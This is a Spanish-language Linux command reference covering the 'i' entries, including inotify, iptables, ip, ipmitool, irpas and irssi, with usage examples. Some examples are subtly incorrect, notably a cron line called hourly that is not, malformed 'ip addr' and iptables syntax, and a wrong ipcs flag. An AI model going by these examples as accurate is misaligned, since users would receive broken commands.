Siendo USUARIO el nombre de usuario que hará login automático.


innotop
Monitorización del servidor de bases de datos mysql.
$ innotop -u USER -p PASS -h localhost -P 3306
Nota.- Pulsar "q" para salir.


inotify-tools
[INOde noTIFY]. La notificación de inodos es un subsistema que monitoriza eventos en el sistemas de archivos y los reporta a las aplicaciones en tiempo real mediante la API y también puede usarse para monitorizar archivos o directorios individuales. Al monitorizar un directorio, inotify devolverá eventos para el propio directorio y para los archivos dentro de él. Incluye las herramientas fsnotifywait, fsnotifywatch, inotifywait y inotifywatch
$ inotifywait -m /ruta/al/directorio (monitorizar un directorio por cualquier evento)
$ inotifywait -m -e create -e modify -e delete /ruta/al/directorio (monitorizar solo ciertos eventos como creación, modificación y eliminación)
$ inotifywait -m -r -e create /ruta/al/directorio (monitorizar recursivamente en un directorio)
$ inotifywatch -v -t 60 /dev/random (obtener un resumen después de 60 segundos de lecturas en /dev/random)
$ inotifywait -m --timefmt '%H:%M:%S' --format '%T: %e' /dev/random (ver eventos de acceso en tiempo real en /dev/random)
$ inotifywatch -v -e access -e modify -t 30 /ruta/al/directorio (monitorizar solo ciertos eventos)
Algunos eventos comunes que se pueden monitorizar:
          - access: Acceso a contenido
          - modify: Cambio de contenido
          - attrib: Cambio de atributos
          - close_write: Cierre después de escritura
          - create: Creación en directorio
          - delete: Eliminación en directorio
          - move: Movimiento en directorio
1.-
Script Bash para monitorizar un directorio:
$ nano monitor.sh
       #!/bin/bash
       #
       DIRECTORIO=~/prueba
       #
       echo "Observando cambios en: $DIRECTORIO (Ctrl+C para salir)"
       #
       inotifywait -m -e create -e modify -e delete -e move "$DIRECTORIO" |
       while read ruta evento archivo; do
           echo "[EVENTO] $evento en $archivo"
       done
$ chmod +x monitor.sh (permisos de ejecución)
$ ./monitor.sh (ejecutarlo y quedará a la espera de las modificaciones que se produzcan en el directorio ~/prueba)
Después, en otra terminal, crear, editar o borrar archivos en el directorio ~/prueba y en la terminal donde se ha lanzado monitor.sh se verá los eventos en tiempo real.


inputrc
(archivo /etc/inputrc y ~/.inputrc). Librería readline que permite editar líneas de texto usando los modos de emacs y vi. Esto permite estandarizar las combinaciones de teclas entre muchos comandos.
$ nano .inputrc
Ajustes que pueden añadirse al archivo personal.
1.-
Que al pulsar Ctrl+x Ctrl+f liste las funciones y con Ctrl+x Ctrl+v las variables:
# Lista las funciones y variables de readline
"\C-x\C-f": dump-functions
"\C-x\C-v": dump-variables
2.-
Que el autocompletado con la tecla "tab" no distinga mayúsculas y minúsculas:
# Ignora diferencias de mayusculas/minusculas al
# completar con tabulador
set completion-ignore-case on


insmod
Carga modulos.
# insmod módulo


install-info
Utilidad que se encarga de gestionar el índice centralizado de toda la documentación en formato info instalada en el sistema. Permite crear, modificar o eliminar entradas en el archivo /usr/share/info/ normalmente el directorio de documentación Info, haciéndolas accesibles para los lectores como el comando info. En sistemas Debian, el paquete suele reenvíar las opciones al programa real ginstall-info. Su función principal es facilitar la actualización de las entradas en el índice sin intervención manual y suele ejecutarse automáticamente durante la instalación o eliminación de paquetes, aunque también se puede usar manualmente.
# install-info /usr/share/info/mi-prog.info /usr/share/info/dir (añade el contenido de menú especificado en el archivo mi-prog.info al índice general "dir" del sistema)
# install-info --dry-run /usr/share/info/mi-prog.info /usr/share/info/dir (sumula la acción)
# install-info --delete /usr/share/info/mi-prog.info /usr/share/info/dir (elimina la entrada correspondiente a ese manual del índice)
# install-info --entry="* Mi-Prog: (mi-prog).   Manual de Mi-Prog" /usr/share/info/mi-prog.info /usr/share/info/dir (forzar la descripción de la entrada de cómo aparecerá el menú en el índice para ese manual)


install-mbr
Instala un nuevo código MBR al inicio del disco duro.
# install-mbr /dev/sda (instala)
# install-mbr -l /dev/sda (muestra información del código mbr)


installkernel
Instala una nueva imagen del kernel en el sistema desde el árbol de fuentes de Linux. Es llamado por los makefiles del núcleo de Linux cuando make install es invocado. El nuevo núcleo se instala en /boot/vmlinuz-{version}. Si ya existe un enlace simbólico /boot/vmlinuz, se actualiza haciendo un enlace desde /boot/vmlinuz al nuevo núcleo y el núcleo previamente instalado está disponible como /boot/vmlinuz.old. installkernel se instala en /sbin porque los makefiles del núcleo de Linux lo llaman allí y no en /usr/sbin.


instmodsh
Para conocer los módulos perl instalados. Entra en el prompt (cmd?) con 3 preguntas:
l (List all installed modules)
m <module> (Select a module)
q (Quit the program)


integrit
Detectar cuando algún archivo del sistema ha sido alterado mediante la creación, la primera vez que se lanza, de una base de datos con la que confrontar los nuevos escaneos.
Configuración:
# /etc/integrit/integrit.con
Descomentar las lineas:
	root=/
	known=/var/lib/integrit/known.cdb
	current=/var/lib/integrit/current.cdb
Y descartar los directorios que no se deseen incluir en el escaneo, descomentandolos ["cdrom" se descarta, "/dev" se escane, "/usr/src" no se escaneará de forma recursiva ]:
	!/cdrom
	# !/dev
	=/usr/src
Crear la base de datos inicial:
# integrit -u -C /etc/integrit/integrit.conf
Mover la base de datos a know.cdb:
# mv /var/lib/integrit/current.cdb /var/lib/integrit/known.cdb
Lanzar la comprobación:
# integrit -C /etc/integrit/integrit.conf -c
Si queremos colocar la orden en el cron para ser lanzada cada hora y que envie un correo al administrador:
# crontab -e
Y colocamos la linea:
	* 1 * * * integrit -C /etc/integrit/integrit.conf -c | mail root


interfaces
[/etc/network/interfaces]
Archivo de configuración de la red en distros debian.
1.-
Con IP dinámica:
Colocar en el archivo las lineas:
	auto eth0
	iface eth0 inet dhcp
2.-
Con IP fija
Colocar en el archivo las lineas:
	auto eth0
	iface eth0 inet static
	address 192.168.1.10
	gateway 192.168.1.1
	netmask 255.255.255.0
	broadcast 192.168.1.255
Reiniciar el servicio:
# ifdown eth0
# ifup eth0
Nota.- Solo modificandolo en network-manager no funciona.
3.-
Creación de una segunda dirección IP virtual.
Añadir las siguientes lineas a las de la IP fija:
	auto eth0:1
	iface eth0:1 inet static
	address 192.168.0.15
	netmask 255.255.255.0
	broadcast 192.168.0.255
	gateway 192.168.0.1
Nota.- La instalación de nerwork-manager o wicd para la gestión de redes implica comentar las modificaciones de este archivo o en, en el caso de network-manager, editar:
# nano  /etc/NetworkManager/NetworkManager.conf
Y modificar la linea:
	[ifupdown]
	managed=true
4.-
Obtener el módulo que usa una determinada interfaz de red:
# ls /sys/class/net/ (Listar todas las interfaces de red del equipo)
# ls -la /sys/class/net/eth1/device/driver (Ver el módulo del kernel que está usando una interfaz de red)
5.-
Desde la versión v197 de systemd/udev automáticamente se asignan nombres de interfaces de red predecibles y persistentes para todas las interfaces de red Ethernet, WLAN y WWAN, en contra del nombrado tradicional eth0, eth1, wlan0, etc… con la intención de solucionar problemas reales en la detección y configuración de interfaces. Para el ejemplo: enp1s0
      en --> interfaces Ethernet
      wl --> interfaces WLAN
      ww --> interfaces WWAN
La siguiente parte del nombre representa el tipo de adaptador:
      p1 --> para una ubicación PCI [bus número 1]
      s0 --> para una ranura [slot] hot plug [slot número 0]
Si este sistema no gusta y se quiere volver al anterior [eth0, wlan0..] la forma más rápida es:
# nano /etc/default/grub
Y en la linea GRUB_CMDLINE_LINUX="" colocar: net.ifnames=0 biosdevname=0 y se verá:
     GRUB_CMDLINE_LINUX="net.ifnames=0 biosdevname=0"
A continuación actualizar grub:
# update-grub


inxi
Muestra información del equipo (<http://inxi.googlecode.com/svn/trunk/inxi>).
$ inxi -Fpur -c 4
Algunas opciones (con inxi -h la lista completa):
	-A (Audio y tarjetas de sonido)
	-b (informacio básica)
	-c (formato de color de 0 a 32 para la salida de datos)
	-C (CPUs)
	-d (drivers opticos)
	-D (disco duro)
	-F (salida extendida)
	-G (tarjeta gráfica)
	-i (Información de red)
	-I (Procesos, uptime, memoria...)
	-M (Datos de la máquina)
	-N (	tarjetas de red)
	-o (particiones no montadas)
	-p (particiones montadas)
	-r (repositorios)
	-s (sensors[temperaturas cpu])
	-S 	(Host, Kernel,Escritorio y Distro)
	-t cm (Procesos que consumen más cpu [c] y memoria [m])
	-u (UUID de las particiones. -uo las no montadas, -up las montadas)
	-v 6 (Distintas etiquetas de información. Del 1 al 6)


ionice
El programa establece u obtiene la clase de programación de I/O y su prioridad. Si no se dan argumentos o solo "-p", ionice consultará la clase de programación de E/S actual y la prioridad para ese proceso. Si no se especifica ninguna clase, el comando se ejecutará con la clase de programación de "mejor esfuerzo". El nivel de prioridad predeterminado es 4.
$ ionice -c 3 -p 103 (Establece el proceso con PID 103 como un proceso de I/O inactivo [-c 3, 0 para ninguno, 1 para tiempo real y 2 para el mejor esfuerzo])
$ ionice -c 3 ls (el comando "ls" se lanzará con proceso I/O inactivo)
$ ionice -c 2 -n 0 bash (Ejecuta 'bash' como un programa de mejor esfuerzo con la máxima prioridad [-n 0, de 0 a 7, siendo 7 el de menos prioridad])
$ ionice -p 103 145 173 (Imprime la clase y prioridad de los procesos con PID 103, 145 y 173)
# ionice -c3 -p `pidof sshd` (reinicar un servicio dandole un PID)


ioping
Supervisa la latencia del disco en tiempo real. La idea principal detrás de ioping es tener una utilidad similar al ping, que mostrará la latencia del disco de la misma manera que ping muestra la latencia de la red.
$ ioping -i 2 -c 5 / (medir la latencia del disco duro en un periodo de 5 veces con 2 segundos de separación)
$ ioping -c 10 -s 1M /tmp (Medir la latencia en /tmp utilizando 10 solicitudes de 1 megabyte cada una)
$ ioping -RL /dev/sda (Medir la velocidad secuencial del disco)


iostat
muestra estadísticas de la CPU y de la entrada y salida de los dispositivos y particiones.
$ iostat -x sda -d 1 6 (6 reportes con 1 segundo de intervalo sobre el disco sda. Suprimiendo la última cifra [6] continuará reportando datos hasta finalizar con Ctrl+c)
$ iostat -d 3 (actualizará resultados cada 3 segundos)
$ iostat -p sda (Ver estadisticas de un disco concreto con sus particiones)


iotop
monitoriza el ratio de lectura/escritura en disco .
$ iotop -o -u usuario
$ iotop -a -p $(sed 's, , -p ,g' <<<`pgrep "_raid|_resync|jbd2"`) (un raid)
Alguns opciones:
-d 2 (Actualización cada 2 segundos)
-b (No interactivo)
-o (Sólo mostrar procesos que hacen uso de entrada/salida)
-t (Incluir una marca de tiempo)
-p pid (Pid del proceso a monitorizar. Por defecto todos)
-u usuario (especificando usuario)


iozone
Realizar test de velocidad de sistemas de archivos (ext3, ext4...)
$ iozone -s 2g -r 64 -i 0 -i 1 -b test.xls
$ iozone -a -g 2G -f /media/sda2
-a (automático)
-g (Tamaño de los archivos generados)
-f (el sistema de archivos a tratar)
-i (0= escritura, 1= lectura, 2=lectura/escritura....)
-b (archivo que generará con los resultados)


ip
[iproute2]. Configuración de red. Muestra dispositivos, enrutamientos, tuneles.
$ ip addr (Revisar tarjetas)
$ ip route show (Información)
$ ip link show (Ver interfaces de red)
$ ip link set dev eth0 down (bajar una red)
$ ip route add default via 192.168.1.1 (establecer la ip del router)
$ ip link set dev eth0 up (levantar una red)
$ ip addr add 192.168.1.20 255.255.255.0 dev eth1 (establecer una ip estática)
$ ip addr del 192.168.1.55/24 dev eth0 (bajar una ip)
$ ip n  (MAC e IP del router)
$ ip link set dev eth1 address 00:03:44:88:00:11 (Modificdar la MAC. Previamente bajar la red)
$ ip route del default (Eliminar puerta de enlace para crear una nueva)
$ ip route add default via 192.168.1.10 (Crear nueva puerta de enlace)
$ ip route add 192.168.1.53 via 192.168.0.33 (redirigir un pc a otro)
$ ip route add 192.168.1.0/24 via 192.168.0.33 (redirigir una red a un pc)
$ ip -f inet addr show eth0 (información de la dirección ip)
$ ip route add 192.168.2.0/24 via 192.168.1.10 (Añadir una red a una puerta de enlace)
Nota.- Verificar que /etc/resolv contenga una linea con el servidor DNS tipo: nameserver 8.8.8.8 [para las DNS de google] o la 127.0.0.1


ip2host
Resuelve las direcciones IP a los nombres de host en los registros del servidor web.
# ip2host < /var/log/apache2/error.log > logs.txt


ip-ajustes
1.- Estática
# gedit /etc/network/interfaces
	auto eth0
	iface eth0 inet static
	address 192.168.x.x
	netmask 255.255.255.0
	network 192.168.x.0
	boadcast 192.168.2.255
	gateway 192.168.x.1
# /etc/init.d/networking restart (reiniciar el servicio)
$ ip a (verificar la nueva ip)


ipband
Mostrar datos de la conexión. Copiar el arxivo de configuración:
# cp /usr/share/doc/ipband/examples/ipband.conf-simple /etc/ipband.conf
Y descomentar o modificar los siguientes parámetros:
	debug 0
	interface eth1
	fork yes
	htmlfile /srv/www/htdocs/ipbandwidth/index.html
	htmltitle Consumo de banda
	average 10
	accumulate no
	maskbits 32
	localrange 192.168.1.0/24
Reiniciar el servicio:
# /etc/init.d/ipband restart
Arrancar la aplicación:
# ipband
Los informes se muestran poniendo en la barra del navegador: http://localhost/html/ipbandwidth/index.html


ipcalc
Se utiliza para realizar cálculos relacionados con direcciones IP y subredes. Permite obtener información útil como la dirección de red, la máscara de red, el rango de hosts y más. Originalmente, ipcalc estaba pensado para usarse desde el indicador de shell, pero se proporciona un contenedor CGI para permitir la visualización de HTML colorido a través de un servidor web. Puede encontrarlo en el directorio /usr/share/doc/ipcalc/examples.
# ipcalc 192.168.1.10 255.255.255.0 (información básica de una dirección IP y máscara de red)
# ipcalc 192.168.18.4/24 (usando notación CIDR en la cual la cantidad de bits de la máscara de red  es /24 equivalente a 255.255.255.0)
# ipcalc -c 192.168.1.50 192.168.1.0/24 (verificar si una IP pertenece a una subred)
# ipcalc -b 192.168.1.10/24 (solo mostrar información esencial)
# ipcalc 10.0.0.0/16 (mostrar el rango de hosts disponibles en una subred)


ipcrm
Permite eliminar la comunicación entre procesos [ver ipcs]. Si paramos el programa con un Ctrl-C o simplemente sale de forma anormal, el recurso [la memoria compartida] no se libera y queda en el sistema. Con este comando es posible borrarla.
# ipcrm -m 950288 (eliminar un segmento de memoria compartida)
Nota.- La forma de saber el número de segmento es lanzando:
$ ipcs -s


ipcs
Informa sobre la comunicación entre procesos [espacios de memoria, buffers, semaforos..] listando los recursos compartidos que están creados en ese momento. Ver ipcrm. La columna "shmid" muestra el ID, la "owner" el propietario, "perms" los permisos y "bytes" el tamaño en bytes
# ipcs -s | grep postgres  (Muestra los recursos compartidos de postgres)
# ipcs -lm (determinar los limites de memoria compartida del sistema)
# ipcs -ls (Límites actuales del contador que se utiliza para acceder a los recursos compartidos del sistema)
# ipcs -u  (Proporciona información sobre la comunicación entre procesos)
# ipcs -m (despliega los segmentos de memoria compartida)
# ipcs -mu (muestra un breve resumen)
# ipcs -ml (muestra los límites en contraposición a los valores actuales)
# ipcs -m -i 950288 (obtener detalle de un segmento de memoria compartida [valor shmid])
# ipcs -s (Muestra los semforos en el sistema)
Algunas opciones:
-m  (segmentos de memoria compartida )
-q   (colas de mensajes )
-s   (matrices de semáforos )
-a   (todos. Opción por defecto)
-p   (pid)


iperf
Para poder verificar el ancho de banda entre los clientes de una red local. Se instala en todas las máquinas de la red.
# iperf -s (Poner el servidor a la escucha por el puerto 5001)
# iperf -c 192.168.1.10 (Conectar los clientes con el servidor)
Algunas opciones que pueden añadirse:
-f B (Mostrar el resultado en Bytes por segundo [b: bytes/s, k:kilobits/s, m:megabytes/s, B:Bytes/s, K:KiloBytes/s, M:MegaBytes/s] esta opción sirva igual para el cliente que para el servidor)
-t 120 (Tiempo en segundos de duración de la transmisión. Sólo para el cliente)
-D (Lanzarlo como servicio. Sólo en el servidor)
-i 10 (Tempo en segundos entre mediciones. Sólo cliente)


ipfm
Cuenta la cantidad de datos enviados y recibidos por hosts específicos a través de un enlace de Internet. Antes de iniciar el servicio, en el archivo de configuración:
# nano /etc/ipfm.conf
Comentar la linea:
         #DISABLED
Los informes en el navegador con la dirección file:///var/log/ipfm/
# ipfm (arrancar el servicio)


ipgeolocation
Obtener geolocalización de una ip o un dominio. Descarga: <https://github.com/maldevel/IPGeoLocation>
$ ./ipgeolocation.py -m (De la propia ip)
$ ./ipgeolocation.py -t 216.58.210.131 (De una ip)
$ ./ipgeolocation.py -t google.es (De un dominio)
$ ./ipgeolocation.py -t microsoft.com -u "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" (Con un Use Agent personalizado)
$ ./ipgeolocation.py -t debian.com -g (Obtener la geolocalización de una ip y abrir la localización en Google Maps a través del navegador por defecto)
$ ./ipgeolocation.py -t lapipaplena.org --csv /consulta.csv (Exportando los datos a un fichero .csv)
$ ./ipgeolocation.py -t lapipaplena.org -e /consulta.txt (Exportando los datos a un fichero .txt)
$ ./ipgeolocation.py -T objetivos.txt (De una lista a raiz de una ip o dominio por linea)


ipmitool
[openipmi]. Obtener datos del estado de un servidor [que lo soporte] tanto en local desde el propio servidor cómo en remoto. Se trata de un chipset que permite obtener información del estado de diferentes componentes hardware, temperaturas, voltajes, etc... Primero habilitar el demon ipmievd:
# nano /etc/default/ipmievd
Y modificar la linea:
ENABLED=true
En algunas distros es preciso cargar los módulos:
	# ipmi_msghandler
	# ipmi_si
	# ipmi_devintf
	# ipmi_watchdog
	# ipmi_poweroff
# /etc/init.d/ipmi start (Arrancar el servicio)
# ipmitool sensor get "Ambient Temp" (Consulta de la temperatura ambiente)
# ipmitool user list (Listado de usuarios configurados)
# ipmitool -I lan -H 192.168.1.5 -U usuario sel elist (Litar los logs del sistema)
# ipmitool -H 192.168.1.10 -U usuario -P contraseña chassis status (Estado de chasis remoto)
# ipmitool sdr type Temperature (Obtener la temperatura)


ippfind
Encuentra servicios registrados o dispositivos disponibles a través de dispositivos locales. Su propósito principal es encontrar impresoras IPP y mostrar sus URI, mostrar su estado actual o ejecutar comandos.
$ ippfind -l (Enumera los atributos devueltos por Get-Printer-Attributes para impresoras IPP)
$ ippfind -p (imprimir la dirección de la URI)


ipptool
Envía solicitudes IPP arbitrarias a un servidor o a una impresora IPP. Cada archivo de prueba con nombre define una o más solicitudes, incluido el estado de respuesta, los atributos y los valores esperados. La salida es un informe de texto sin formato, texto formateado, CSV o XML en la salida estándar, con un estado de salida distinto de cero indica que una o más pruebas han fallado. ipptool y se puede utilizar para enviar solicitudes IPP arbitrarias a un servidor CUPS o una impresora IPP.
$ ipptool -t -v -f test ipp://localhost:631/printers/HP_psc_1100_series text.txt (informe de prueba CUPS [-t], atributos de solicitud y respuesta en modo de prueba CUPS [-v] y nombre de archivo de solicitud predeterminado para las pruebas [-f])


ips
Programa tipo ps que muestra los estados de los procesos obtenidos en el archivos /proc. Tiene funciones para facilitar el seguimiento de procesos activos, semiactivos y transitorios.
$ ips


ipscan
Escanea la red en busca de máquinas activas.
$ ipscan -s -f:range 192.168.1.1 192.168.1.255 (todo el rango de ips)
$ ipscan -s -f:file ips.txt (Las especificadas en el archivo ips.txt [una por linea])
$ ipscan -s -f:range 192.168.1.9 192.168.1.16 -o resultat.txt (Derivando el resultado a un archivo)


iptables
[= ip6tables]. Herramienta de cortafuegos y trafico de red.
Algunos ejemplos generales:
	# iptables -F (eliminar todas las reglas)
	# iptables -L (si está activo y con qué reglas)
	# iptables -L -vn (mostrando los puertos e información detallada)
	# iptables -S (mostrar todas las reglas)
	# iptables -L -t nat (Listar reglas de una tabla concreta)
	# iptables -L fail2ban-ssh (comprobar las ips bloqueadas por fail2ban)
	# iptables -D fail2ban-ssh 1 (Quitar la primera ip baneada de las ips bloqueadas)
	# iptables -nL --line-numbers (muestra el orden de ejecución de las reglas)
	# iptables -nL INPUT (Lista todas las reglas de entrada)
	# iptables -nL FORWARD (Lista todas las reglas de salida)
	# iptables -D INPUT 3 (borrar la regla número 3)
	# iptables -A INPUT -j LOG (Guardar logs de todos los bloqueos)
Bloquear (DROP)
	# iptables -P INPUT DROP (Bloquear todo lo que entra)
	# iptables -A INPUT -s IP -j DROP (una ip)
	# iptables -A INPUT -s IP -i eth0 -j DROP (una ip de una red)
	# iptables -A INPUT -s IP -p tcp -dport 22 -j DROP (un puerto de una ip)
	# iptables -A INPUT -s 192.168.1.0/24 -j DROP (una red)
	# iptables -A INPUT -m mac --mac-source 00:11:22:33:44:55 -j DROP (una mac)
	# iptables -A INPUT -p tcp --destination-port 21 -j DROP (puerto 21 de entrada)
	# iptables -A INPUT -p tcp -s IP --destination-port 21 -j DROP (el puerto 21 de entrada sólo para una IP)
	# iptables -A INPUT -p tcp -i eth0 -m multiport --destination-port 22,80,443 -j ACCEPT (Varios puertos)
	# iptables -A INPUT p tcp -s 192.168.1.0/24 --destination-port 21 -j DROP (el  puerto 21 de entrada para todo un rango de IPs)
	# iptables -A FORWARD -p tcp --dport 25 -j DROP (la salida del puerto 25)
	# iptables -A INPUT -p tcp --dport 22 -j LOG --log-prefix "Puerto 22 bloqueado" iptables -A INPUT -p tcp --dport 22 -j DROP (haciendo aparecer una mensaje informando del bloqueo)
Permitir (ACCEPT)
	# iptables -I INPUT 3 -s 192.168.1.0/8 -j ACCEPT (a la red especificada y poner la regla en tercer lugar)
	# iptables -D INPUT -s 192.168.1.0/8 -j ACCEPT (Quitar la regla anterior)
	# iptables -A INPUT -i lo -p all -j ACCEPT (todas las entradas a localhost)
	# iptables -A OUTPUT -o lo -p all -j ACCEPT (todas las salidas a localhost)
	# iptables -A INPUT -p tcp --dport ssh -j ACCEPT (Un servicio concreto)
	# iptables -A INPUT -p tcp -i eth0 -m multiport --destination-port 22,80,443 -j ACCEPT (Todas las entradas a varios puertos)
	# iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -j ACCEPT  (Permitir trafico ssh saliente para la red especificada)
1.-
Salvar las reglas de iptables y restablecerlas manualmente:
# iptables-save  > /etc/iptables.rules
# iptables-restore < /etc/iptables.rules
Si se quiere añadir reglas a las existentes:
# iptables-save -c > /etc/iptables.rules


iptables-persistent
Otra forma de guardas reglas de iptables. Al instalar el paquete pregunta por guardar las reglas existentes, las cuales se guardan en /etc/iptables/rules.v4 y /etc/iptables/rules.v6 [versión más actual de ip6tables]. Si modificamos, añadimos o suprimimos reglas podemos, para volver a guardarlas lanzando:
# dpkg-reconfigure iptables-persistent
En realidad este paquete lo que hace es:
# iptables-save > /etc/iptables/rules.v4
# ip6tables-save > /etc/iptables/rules.v6
Y para restituirlas despues de un reinicio:
# iptables-restore < /etc/iptables/rules.v4
# ip6tables-restore < /etc/iptables/rules.v6
Tambien puede usarse cuando se se pueden gardar y releer el archivo con netfilter-persisten que viene con el mismo paquete iptables-persisten:
# netfilter-persistent reload
# netfilter-persistent save
O borrar las reglas de iptables:
# netfilter-persistent flush


iptotal
Monitor de tráfico IP. Mide el uso del ancho de banda.
# iptotal eth0 -r 60 (Escuchará 60 segundos antes de informar)
# iptotal eth0 -r 120 -d 3 -P  (con alto nivel de depuarión[-d 3] y modo promiscuo [-P]


iptraf
Muestra información en tiempo real sobre el tráfico de red.
# iptraf -i eth0 (Analiza todo el trafico de la red eth0)
# iptraf -i all (Analiza el de todas las redes)
# iptraf -s eth0 (Analiza el tráfico agrupandolo por protocolo y puerto)
# iptraf -z eth0 (Contabiliza paquetes y agrupa por tamaño)
Una vez lanzada la aplicación, para salir pulsar X


ipwatchd
Demonio que analiza todos los paquetes ARP entrantes para detectar conflictos de IP. Se puede configurar para escuchar en una o más interfaces en modo activo o pasivo. En modo activo, IPwatchD protege el host antes de que se apodere de la IP respondiendo solicitudes ARP gratuitas recibidas de sistemas en conflicto. En modo pasivo, simplemente registra información sobre conflictos a través de la interfaz syslog estándar. La mencionada configuración ha de realizarse en el archivo:
# nano /etc/ipwatch.conf
  iface_configuration automatic
  #iface eth0 active
  #iface eth0:0 passive
  defend_interval 10
  user_script /usr/sbin/ipwatchd-script
  syslog_facility daemon
# ipwatchd -c /etc/ipwatchd.conf -d (activar el daemon)


irb
Interprete de comandos interactivo de ruby. Para entrar en la shell:
	$ irb
	irb(main):001:0> print "Hola mundo"
	Hola mundo=> nil
	irb(main):002:0> exit
	$
Explicación de la salida:
	irb(main) (que estás en la consola de irb y en el contexto de un programa)
	:001 (La linea en la que te encuentras)
	:0 (Profundidad. Por ejemplo en Ruby los IF terminan con END. Si ponemos un IF sin el END, el ":0" cambia a ":1" al ponerlo retorna al valor ":0". Si colocamos varios IFS anidados, entonces el nivel de profundidad dirá :1 nivel de profundidad, :2 niveles de profundidad, :3 niveles de profundidad y así sucesivamente)
	print ... (Comando a ejecutar)
	Hola ... (Ejecución)
	==> nil (Final del proceso)
	exit (Salir del interprete)


irpas
Paquete que contiene una colección de programas utilizados para operaciones de red avanzadas, pruebas y depuración. Los paquetes incluidos son los siguientes:
    - cdp - remitente del paquete del protocolo de descubrimiento de Cisco
    - igrp - inyector de ruta IGRP
    - ass - Escáner de sistema autónomo
    - irdp - remitente IRDP
    - irdpresponder - respondedor IRDP
    - itrace - trazado de ruta basado en ICMP
    - tctrace - Traceroute basado en TCP SYN
    - protos - escáner de puertos basado en ICMP
    - netmask - pide máscara de red a través de ICMP
    - file2cable - Vuelca cualquier archivo binario directamente a ethernet
    - dfkaa: soluciona problemas de dispositivos anteriormente conocidos como Ascend (Pipeline, etc.)
    - netenum: escáner de ping diseñado para scripts de shell
    - hsrp: probador de conmutación por error HSRP
    - icmp_redirect - Sistema de redireccionamiento ICMP
    - timestamp - Solicitante de marca de tiempo ICMP
    - dhcpx - "ejercitador" del servidor DHCP


irssi
Chatear via terminal.
$ irssi (Arrancar la aplicacuón)
	set nick el_nick (establecer nick habitual)
	set quit_message Mi Mensaje de salida (mensaje que se mostrará al salir del xat)
	save (Obligatorio para guardar todos los cambios)
	network list (lista de las redes existentes)
	network remove nombre_de_red (borrar una red)
	server list  (lista de todos los servidores guardados)
	server remove nombre_de_servidor  (borrar un servidor)
	connect la_red  (Conectar a una red))
	channel add -auto #canal la_red (Conexión automática a determinado canal de una red)
	list *linux *   (ver listado de canales que tengan “linux” por titulo)
	join #canal (Después de conectar con una red, entrar en determinado canal)
	part  #canal mensaje (salir de un canal con un mensaje)
	quit (cierra la aplicación)
	disconnect servidor  (desconecta de un servidor)
	msg usuario un_mensaje  (Manda un mensaje privado a un usuario)
	nick  otro_nick> (Cambiar de nick)
	close usuario  (cierra la ventana de un usuario)
	dcc usuario fichero  (inicia la transferencia de un archivo con usuario)
	exit (desconecta el servidor)
	channel (muestra informacion sobre un canal y los usuarios conectados)
	win #ventana  (cambiar de ventana. igual que con ESC + num de ventana)
	script list   (Listado)
	help script (ayuda)
	nick el_nick:contraseña (logearse con nombre de usuario y contraseña)
	msg el_nick set la_contraseña nueva_contraseña (modificar contraseña)
	crear una red y servidores:
	network add mi_red (crear una red local [mi_red])
	server add -auto -network mi_red la_red 6667 password  (Establecer que la red local [mi_red] se conecte automaticamente al arrancar a una red externa [la_red], especificando puerto y contraseña si procede, en caso contrario suprimir estos dos últimos parámetros).
Instalar nuevos themes:
Descargar de la pagina oficial de irssi (http://irssi.org/themes) y moverlos a la carpeta ~/.irssi. Para instalarlos:
	set theme nombre.theme
	save
Para la instalacion de Scripts, descargarlos de la pagina oficial (<http://scripts.irssi.org/>) y moverlos a la carpeta ~/.irssi/scripts/ si deseamos cargarlos o descargarlos manualmente:
	script load nombre_script   (Cargarlo)
	script unload nombre_script (Descargarlo)
0 moverlos a la carpeta ~/.irssi/scripts/autorun para que se carguen automaticamente.
Nota.- Algunos de estos scripts necesitan para funcionar correctamente de algunas librerias.
Habilitar un registro de las conversaciones:
# mkdir /var/log/irssi  (Crear la carpeta)
# chown usuario:users /var/log/irssi (Asignar permisos)
Arrancar irssi y teclear:
	set autolog ON
	set autolog_path /var/log/irssi/$tag/$0.log
	save
# touch /etc/logrotate.d/irssi
# nano /etc/logrotate.d/irssi
Agregar el siguiente contenido:
	/var/log/irssi/*/*.log {
	copytruncate
	compress
	notifempty
	missingok
	}


ischroot
Detectar si se está ejecutando en un chroot. El estado de salida es:
	0 (si actualmente se ejecuta en un chroot)
	1 (si actualmente no se está ejecutando en un chroot)
	2 (si la detección no es posible)
# ischroot -f (Salir con el estado 1 si la detección no es posible)
# ischroot -t (Salir con estado 0 si la detección no es posible.


iso_8859-1
El estándar ISO 8859-1 es un conjunto de caracteres codificados en octal, decimal y hexadecimal para el juego de caracteres ASCII que son los más utilizados por muchos idiomas de Europa occidental. También conocida como Latin1
$ man iso_8859-1 (muestra los caracteres unicode)
$ µ (ctrl-shift-u b5 intro)


isoinfo
Información sobre una iso
$ isoinfo -d -i archivo.iso


isoquery
Este programa se puede utilizar para generar una salida tabular de los códigos estándar ISO proporcionados por el paquete iso-codes. Por defecto usa la ISO 3166-1 pero puede especificarse con el argumento -i cualquiera: 639-2, 639-3, 639-5, 3166-1, 3166-2, 3166-3, 4217, 15924.
$ isoquery -l es -o (en español y nombre oficial)


isosize
muestra el tamaño de un sistema de ficheros iso9660 en bytes
$ isosize archivo.iso


ispell
Ispell corrige la ortografía en texto plano, LaTeX, sgml/html/xml y archivos nroff. Este paquete no incluye diccionarios de ispell, debe instalarse al menos uno de ellos. Ha sido  reemplazado por herramientas más modernas como aspell o hunspell. Incluye las herramientas buildhash, defmt-c, defmt-sh, findaffix, icombine, ijoin, ispell, munchlist y tryaffix.
$ ispell file.txt (lee file.rxr y presenta al usuario las palabras que considera mal escritas, ofreciendo sugerencias de corrección)
$ ispell -t file.tex (ignora los comandos de LaTeX y verifica solo el texto)
$ ispell -d es -h file.html (ignora las etiquetas y atributos y usa un diccionario es, no el predeterminado, verificando el contenido)
$ buildhash mi_diccionario.txt mis_reglas.aff mi_diccionario.hash (Con un diccionario de palabras personalizado y un archivo de reglas de afijos, crea diccionario para ispell)
$ ispell -d mi_diccionario.hash mi_documento.txt (usar este diccionario con ispell)
$ defmt-c mi_diccionario.hash mi_diccionario.c (convierte un diccionario `ispell, que incluye el archivo de palabras y el archivo de afijos, en un formato de código fuente C)
$ findaffix palabras_cientificas.txt (intenta descubrir patrones de afijos [prefijos y sufijos] en una lista de palabras)
$ icombine diccionario_medico.hash diccionario_legal.hash > diccionario_combinado.hash (permite fusionar múltiples diccionarios en uno solo)
